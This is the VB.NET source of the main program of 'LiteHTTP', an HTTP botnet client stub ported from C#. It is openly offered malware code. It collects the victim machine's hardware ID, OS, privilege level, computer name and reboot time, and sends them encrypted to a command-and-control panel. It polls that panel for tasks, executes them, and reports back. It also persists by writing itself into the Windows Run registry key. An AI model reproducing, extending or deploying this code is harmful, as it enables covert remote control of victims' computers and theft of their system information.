
Imports System.Text
Imports Microsoft.Win32
Imports System.Threading
Imports Stub.LiteHTTP.Classes

'=======================================================
'LiteHTTP C# to VB.NET | by NYAN CAT
'
'credit ; zettabithf
'credit ; Telerik
'=======================================================

Namespace LiteHTTP

    Class Program

        Public Shared s As Thread

        Public Shared Sub Main(ByVal args As String())
            Dim x As Thread = New Thread(New ThreadStart(AddressOf mainthread))
            x.Start()
            s = New Thread(New ThreadStart(AddressOf startthread))
            s.Start()
        End Sub

        Private Shared Sub mainthread()
            Dim id As String = Identification.getHardwareID()
            Do
                Try
                    Dim os As String = Identification.osName()
                    Dim pv As String = Nothing
                    If Misc.isAdmin() Then
                        pv = "Admin"
                    Else
                        pv = "User"
                    End If

                    Dim ip As String = Misc.getLocation()
                    Dim cn As String = New Microsoft.VisualBasic.Devices.Computer().Name
                    Dim lr As String = Misc.lastReboot()
                    Dim par As String = "id=" & Communication.encrypt(id) & "&os=" + Communication.encrypt(os) & "&pv=" + Communication.encrypt(pv) & "&ip=" + Communication.encrypt(ip) & "&cn=" + Communication.encrypt(cn) & "&lr=" + Communication.encrypt(lr) & "&ct=" + Communication.encrypt(Settings.ctask) & "&bv=" + Communication.encrypt(Settings.botv)
                    Dim response As String = Communication.decrypt(Communication.makeRequest(Settings.panelurl, par))
                    If response <> "rqf" Then
                        If response.Contains("newtask") Then
                            Dim sps As String() = response.Split(":"c)
                            Dim tid As String = sps(1)
                            If tid <> Settings.ctask Then
                                Settings.ctask = tid
                                If Misc.processTask(sps(2), sps(3)) Then
                                    Communication.makeRequest(Settings.panelurl, par & "&op=" + Communication.encrypt("1") & "&td=" + Communication.encrypt(tid))
                                    If Encoding.UTF8.GetString(Convert.FromBase64String(sps(2))) = "10" OrElse Encoding.UTF8.GetString(Convert.FromBase64String(sps(2))) = "9" Then
                                        Communication.makeRequest(Settings.panelurl, par & "&uni=" + Communication.encrypt("1"))
                                        Environment.[Exit](0)
                                    End If
                                End If
                            End If
                        End If
                    End If
                Catch
                End Try

                Thread.Sleep(Settings.reqinterval * 60000)
            Loop While True
        End Sub

        Private Shared Sub startthread()
            If Settings.startupkey <> "" Then
                Try
                    If Not Misc.keyExists(Settings.startupkey) Then
                        Dim reg As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                        reg.SetValue(Settings.startupkey, """" & Misc.getLocation() & """", RegistryValueKind.String)
                    End If
                Catch
                End Try
                Thread.Sleep(3000)
            End If
        End Sub
    End Class
End Namespace


